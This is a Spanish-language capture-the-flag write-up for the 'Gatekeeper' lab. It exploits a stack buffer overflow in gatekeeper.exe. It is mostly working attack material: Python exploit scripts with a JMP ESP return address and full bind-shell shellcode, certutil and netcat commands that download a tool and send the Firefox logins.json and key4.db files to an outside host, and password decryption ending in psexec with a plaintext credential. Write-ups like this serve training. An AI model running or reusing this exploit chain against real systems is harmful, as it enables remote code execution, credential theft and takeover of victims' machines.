# Write-Up-Gatekeeper

#ENUMERACIÒN
# Nmap 

```nmap -sC -sV -T5 -Pn -vv (target ip)``` 

![1](https://user-images.githubusercontent.com/107126653/172824365-26348884-9465-4f47-b226-978733daace3.png)

Me pareció interesante el puerto 31337

usamos smb con el objetivo de bajarnos a nuestra maquina el archivo gatekeeper.exe

```smbclient   \\\\(target ip)\\Users``` 

![2](https://user-images.githubusercontent.com/107126653/172825695-899cc3c4-025e-4050-a6a8-726666a6649b.png)

comandos a usar en windows 
```
dir  Sirve para listar todo el directorio donde nos encontremos
cd   Sirve para entrar en un directorio
get  Sirve para descargar archivos.
```
![3](https://user-images.githubusercontent.com/107126653/172828200-c67f82ad-e3ad-4ac3-be18-3b50155d167d.png)

![4](https://user-images.githubusercontent.com/107126653/172828211-2e385488-94a6-42b2-b1cb-8a8a19ef91c6.png)

![5](https://user-images.githubusercontent.com/107126653/172828227-78e3710c-5de9-4307-9e8c-1c600759750a.png)

Una vez descargado el archivo estarà donde hayamos ejecutado el SMBCLIENT en este caso la carpeta personal , con un ```ls```

![6](https://user-images.githubusercontent.com/107126653/172828677-6e0f5f1b-509b-4494-8a82-694483cf3fef.png)

Para el siguiente paso utilizaremos una herramienta muy util ```X32dgb.exe``` https://github.com/therealdreg/x64dbg-exploiting , sería aconsejable que te lo instalases.

#X32DBG

![7](https://user-images.githubusercontent.com/107126653/172829871-0ad55dd2-2f4a-439c-b883-34f5cdfbbf5e.png)

Abrimos el archivo gatekeeper.exe

![8](https://user-images.githubusercontent.com/107126653/172830228-d21c80fa-b25e-46d8-a012-a09f480d2c31.png)
 
 Te encuentras con esta MARAVILLA si , impresiona, tranquilo yo te lo explico . Ve por un cafè y disfruta.
  
 ![10](https://user-images.githubusercontent.com/107126653/172830838-bfab15d9-dbf3-4960-be82-7a2793c7b1e5.png)

Nos vamos  LOG  (arriba a la izquierda)

*Cuando estemos en LOG abajo de LOG en command: introducimos estos comandos siempre que reiniciamos/apagamos la maquina.
```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```
![12](https://user-images.githubusercontent.com/107126653/172831935-42213adf-0878-4945-945a-27f0566e9c10.png)

Si te ha salido esto, tranquilo no te alarmes . ¡VAMOS BIEN!.

```
mona.mona("pattern_create 2000")
```
Utilizamos este comando para generar 2000 bytes  unicos en  que este write up  son las idoneas.

![13](https://user-images.githubusercontent.com/107126653/172833016-434f5a8a-2730-49ca-bc20-f4effdfdd7da.png)

lo copiamos! y nos vamos a un .PY que nos vamos a crear un script que va realizar un EXPLOIT.
También sería aconsejable bajarnos ```NOTEPAD ++```

*importante  dale guarda como (nombre que quieras) con la extension .py  

```
import socket

ip = "IP"
port = 31337



shellcode  = 

  
#badchars 
buf =  "\x41" * (CANTIDAD DE A)
buf +=  "DIRECCION DE RETORNO"
buf += shellcode


 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```
Puedes utilizar esta plantilla. En IP primero probamos con local host ```127.0.0. 1```


![15](https://user-images.githubusercontent.com/107126653/172839502-88c90fdb-6601-4e96-8df9-d539bcd07eeb.png)

pegamos los 2000 bytes en SHELLCODE entre ' '  o " ". ( te tiene que salir en color gris en vez de en negro). con un CONTROL + S guardamos.

Volvemos al X32DBG pulsa restart (arriba izq). Pulsamos run (flecha derecha). Ahora vamos a ejecutar el .py desde una CMD (simbolo del sistema) , en mi caso me instale la ultima version de python 3.10. si te 
lo instalas de forma generica. estarà localizado aquì. 

```C:\Users\xpl\Desktop>C:\Users\xpl\AppData\Local\Programs\Python\Python310\python.exe gatekeeper.writeup.py```

*xpl por que estoy ejecutando x32dgb en un windows.

![16](https://user-images.githubusercontent.com/107126653/172840003-058d226a-aed6-4c7b-91b1-293a7b11a625.png)

Si esta todo correcto deberìa salir asì.

Ahora vamos al x32dbg y en EIP hacemos copy y en log utilizaremos este comando ```mona.mona("pattern_offset EIP")``` en lugar de EIP pegamos ( no hace falta copiar y pegar pero es una praxis).

![17](https://user-images.githubusercontent.com/107126653/172841149-844eb476-8c1d-4fa6-a8d1-004de3492eea.png)
Ahora nos indicarà una cantidad de bytes que llena hasta llegar a EIP , que tenemos que introducir.

modificamos ahora en el .py
```
import socket

ip = "127.0.0.1"
port = 31337


#badchars 
buf   = "\x41" * 146
buf  += "\x42" * 4
 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
CONTROL + S
Tiene que quedar asì.

*para que todo sea mas clara la mecanica sera mayormente serà: modificamos el python, debug restart , ejecutamos el py. del CMD.

Vemos en CPU . Que EIP esta al completo de 42 (B) En hexadecimal.
![18](https://user-images.githubusercontent.com/107126653/172842784-2bf73437-6ea0-401b-b5e4-166d3a15e9a4.png)


para ASEGURARNOS de que la pila esta correctamente posicionada hacemos lo siguiente CLICK DERECHO :

![19 2](https://user-images.githubusercontent.com/107126653/172844121-5a38c6bc-6fdd-4492-828f-d69b7798fdd7.png)


![19](https://user-images.githubusercontent.com/107126653/172843848-dcc8699c-7580-44cc-831d-2efdc16053d7.png)
 
 Vemos que todo esta bien posicionado y SEGUIMOS!
 
 Ahora vamos a buscar los bytes  que al programa No le gustan mediante este comando que introduciremos en el LOG:
 ``` mona.mona('bytearray -cpb "\\x00"')```
 
como resultado tenemos una serie de bytes dnde no encontraremos por ejemplo el x00 que pusimos arriba:
![20](https://user-images.githubusercontent.com/107126653/172850442-73c0754f-cce8-4f94-b9fb-596b1149c664.png)

copiamos y pegamos en el python quedando tal que así:

```
import socket

ip = "127.0.0.1"
port = 31337


#badchars 
buf   = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
buf   += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
buf   += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
buf   += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
buf   += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
buf   += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
buf   += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
buf   += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
*modificamos el python lo guardamos, debug restart , run y ejecutamos el py. del CMD.

ahora utilizamos el comando ```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')``` que sirve para comparar con los badchars que hayamos introducido en el python.

![21](https://user-images.githubusercontent.com/107126653/172854356-676d17ae-3449-4707-b260-25c7db548d78.png)
 
 como veis nos da un badchar que es el   0a asi que repetimos los pasos anteriores. ```mona.mona('bytearray -cpb "\\x00\x0a"')``` luego utilizamos el ```
mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')```
 
El gatekeeper.py lo dejaremos asi:
```
import socket

ip = "127.0.0.1"
port = 31337


#badchars \x00 \x0a
buf    =  "\x41" * 146
buf   +='BBBB'
buf   += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
buf   += "\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
buf   += "\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61"
buf   += "\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
buf   += "\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1"
buf   += "\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1"
buf   += "\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
buf   += "\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
*modificamos el python lo guardamos, debug restart , run y ejecutamos el py. del CMD.
Hacemos el ```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')```como resultado debe salir esto:
![22](https://user-images.githubusercontent.com/107126653/172856342-6e2d65b7-503b-4b4d-8cc3-16c588110dd9.png)
HOORRAY!!!! Estos son todos los badchars! .


ahora tenemos que conseguir la direccion de retorno mediante este comando  ``mona.mona("jmp -r esp")``
![23](https://user-images.githubusercontent.com/107126653/172857048-392a61d7-41f9-459e-9c86-7d998b7b19ba.png)
obtenemos estas direcciones que debemos de introducir en el python pero antes debemos de comprobar que no esten los badchars que hemos conseguido anteriormente.En el python debe quedar así:

``
import socket

ip = "127.0.0.1"
port = 31337




#146
#080414c3 
#badchars \x00 \x0a
buf    =  "\x41" * 146
buf +=  "\xc3\x14\x04\x08"
buf   += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"
buf   += "\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
buf   += "\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61"
buf   += "\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
buf   += "\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1"
buf   += "\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1"
buf   += "\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
buf   += "\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
``
yo he elegido esta direccion: 0x080414c3 se debe de introducir como esta en el python  de DERECHA A IZQUIERDA.

Buscaremos en google una binshell adecuada tomamos como ejemplo está : https://packetstormsecurity.com/files/156148/Windows-x86-Dynamic-Bind-Shell-Null-Free-Shellcode.html

debe quedar así:
import socket
``
ip = "127.0.0.1"
port = 31337




#146
#080414c3 
#badchars \x00 \x0a
buf    =  "\x41" * 146
buf +=  "\xc3\x14\x04\x08"
buf   += "\x55\x89\xe5\x83\xec\x60\x31\xc0\x66\xb8\x73\x73\x50\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65"
buf += "\x74\x50\x89\x65\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x40\x1c\x89\xc3\x8b\x03\x89\xc3\x8b\x03\x8b"
buf += "\x40\x08\x89\x45\xf8\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf4\x8b\x4b\x24"
buf += "\x01\xc1\x89\x4d\xf0\x8b\x53\x1c\x01\xc2\x89\x55\xec\x8b\x53\x14\x31\xc0\x8b\x7d\xf4\x8b\x75\xfc\x31\xc9"
buf += "\xfc\x8b\x3c\x87\x03\x7d\xf8\x66\x83\xc1\x0f\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf0\x8b\x55\xec"
buf += "\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xf8\x89\x45\xe8\x31\xd2\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72"
buf += "\x68\x4c\x6f\x61\x64\x54\xff\x75\xf8\x8b\x45\xe8\xff\xd0\x89\x45\xe4\x31\xc0\x66\xb8\x33\x32\x50\x68\x77"
buf += "\x73\x32\x5f\x54\x8b\x5d\xe4\xff\xd3\x89\x45\xe0\x31\xd2\x66\xba\x75\x70\x52\x68\x74\x61\x72\x74\x68\x57"
buf += "\x53\x41\x53\x54\xff\x75\xe0\x8b\x45\xe8\xff\xd0\x89\x45\xdc\x31\xdb\x66\xbb\x90\x01\x29\xdc\x54\x53\x8b"
buf += "\x45\xdc\xff\xd0\x31\xd2\x66\xba\x74\x41\x52\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\xff\x75\xe0\x8b"
buf += "\x45\xe8\xff\xd0\x89\x45\xd8\x31\xdb\x53\x53\x53\x31\xc9\xb1\x06\x51\x43\x53\x43\x53\x8b\x45\xd8\xff\xd0"
buf += "\x89\x45\xd4\x31\xdb\x53\x66\x68\x11\x5c\x80\xc3\x02\x66\x53\x89\x65\xd0\x31\xc9\x51\x68\x62\x69\x6e\x64"
buf += "\x54\xff\x75\xe0\x8b\x45\xe8\xff\xd0\x89\x45\xcc\x6a\x10\xff\x75\xd0\xff\x75\xd4\x8b\x45\xcc\xff\xd0\x31"
buf += "\xc9\x66\xb9\x65\x6e\x51\x68\x6c\x69\x73\x74\x54\xff\x75\xe0\x8b\x45\xe8\xff\xd0\x89\x45\xc8\x31\xc9\x51"
buf += "\xff\x75\xd4\x8b\x45\xc8\xff\xd0\x31\xc9\x66\xb9\x70\x74\x51\x68\x61\x63\x63\x65\x54\xff\x75\xe0\x8b\x45"
buf += "\xe8\xff\xd0\x89\x45\xc4\x31\xc9\x51\x51\xff\x75\xd4\x8b\x45\xc4\xff\xd0\x89\x45\xc0\xba\x63\x63\x6d\x64"
buf += "\xc1\xea\x08\x52\x89\x65\xbc\x31\xd2\x83\xec\x10\x89\x65\xb8\x31\xd2\xff\x75\xc0\xff\x75\xc0\xff\x75\xc0"
buf += "\x52\x52\x31\xc0\x40\xc1\xc0\x08\x40\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x44\x50\x89"
buf += "\x65\xb4\x31\xd2\x66\xba\x73\x41\x52\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\xff"
buf += "\x75\xf8\x8b\x45\xe8\xff\xd0\x89\x45\xb0\x31\xd2\xff\x75\xb8\xff\x75\xb4\x52\x52\x52\x31\xc0\x40\x50\x52"
buf += "\x52\xff\x75\xbc\x52\x8b\x5d\xb0\xff\xd3\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63"
buf += "\x68\x45\x78\x69\x74\x54\xff\x75\xf8\x8b\x45\xe8\xff\xd0\x89\x45\xac\x31\xd2\x50\x8b\x45\xac\xff\xd0"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buf + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  ``
tenemos que cambiar la ip por el TARGET_IP y escuchar en el puerto 444 a continuación ,abriremos dos CMD , en una estaremos escuchando con NETCAT (TARGET_IP) (PORT) y en la otra ejecutaremos el gatekeeper.py teniendo esta foto como resultado.

![24](https://user-images.githubusercontent.com/107126653/172870160-13840a00-aecc-4e5f-a446-826237e737dd.png)

#escalacion con linux

ejecutamos el gatekeeperwriteup.py dando como resultando:
![sendin evil](https://user-images.githubusercontent.com/107126653/172893623-b841acbb-dfd8-4a92-b970-1584c8309629.png)




* si tienes problemas para conectarte con NC  prueba cierra la vpn y vuelve a ejecutarla.



una vez nos conectamos mediante una BINDSHELL 
![natbat](https://user-images.githubusercontent.com/107126653/172892019-9483f563-5444-40ea-b9c9-cce465fef434.png)





usando los comandos dde windows podemos conseguir sin dificultad la primera flag siendo la user.txt.txt
![natbat flag](https://user-images.githubusercontent.com/107126653/172892126-79db0337-c281-4b41-8c6a-510ff31ce8cf.png)


ATENTO A ESTOS PASOS

vamos a esta dirección```C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release```

nos bajamos de github este repositorio  a nuestra kali linux ```git clone https://github.com/lclevy/firepwd.git```

                                                            ```wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip```
                                                           ```unzip netcat-win32-1.12.zip```
                                                            ```python3 -m http.server ```
                                                            ```certutil -urlcache -f "http://IP:8000/nc.exe" nc.exe ```
                                                            ```nc -nlvp 1234 > logins.json ```
                                                             ```nc.exe -nv 10.11.70.166 1234 < logins.json ```
                                                             ``` nc -nlvp 1234 > key4.db```
                                                              ```nc.exe -nv 10.11.70.166 1234 < key4.db ```
                                                              ```mv logins.json firepwd/ ```
                                                              ```mv key4.db firepwd/```
                                                              ```pip install -r requirements.txt```
 cuando ejecutemos este comando  ```python3 firepwd.py``` debe salir:
 ![USER Y PASSPWORD](https://user-images.githubusercontent.com/107126653/172899014-f301f890-9363-4b55-b7e4-c030b04a0471.png)

   ejecutamos  ```python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.29.138 cmd.exe```
   
   ![system32](https://user-images.githubusercontent.com/107126653/172903722-62caf4ec-b759-4238-8604-85b827b83558.png)
   

   ahora ![users root](https://user-images.githubusercontent.com/107126653/172903753-217771e4-11d7-4f81-beb4-ef493cecf3a9.png)
    
                                                
   users! ![amyor desktop](https://user-images.githubusercontent.com/107126653/172903757-111e45fa-88e1-478d-9196-e173be309ea3.png)
     
     
   finalmente ![root](https://user-images.githubusercontent.com/107126653/172903935-b0545cae-ccdb-48ed-b085-ea0c58630af6.png)
                                       
                                                    
